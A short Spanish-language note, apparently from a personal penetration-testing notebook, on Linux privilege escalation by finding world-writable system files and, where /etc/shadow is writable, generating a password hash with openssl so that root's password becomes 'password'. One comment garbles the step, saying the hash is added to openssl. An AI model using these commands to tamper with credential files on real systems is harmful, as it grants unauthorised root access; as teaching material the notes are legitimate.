
Importante ver si hay archivos de configuración del sistema en los cuales podamos realizar modificaciones.

```bash
#Nos dice ficheros que podemos modificar
find / -not -type l -perm -o+w

ls -al /etc/shadow

#Si vemos que podemos modificar el shadow podemos añadir o modificar los permisos de los usuarios.
openssl passwd -1 -salt abc password

#Con este comando podemos generar una passwd y añadirla al openssl para que el usuario root tenga de password password.
```

![[Pasted image 20250221100834.png]]
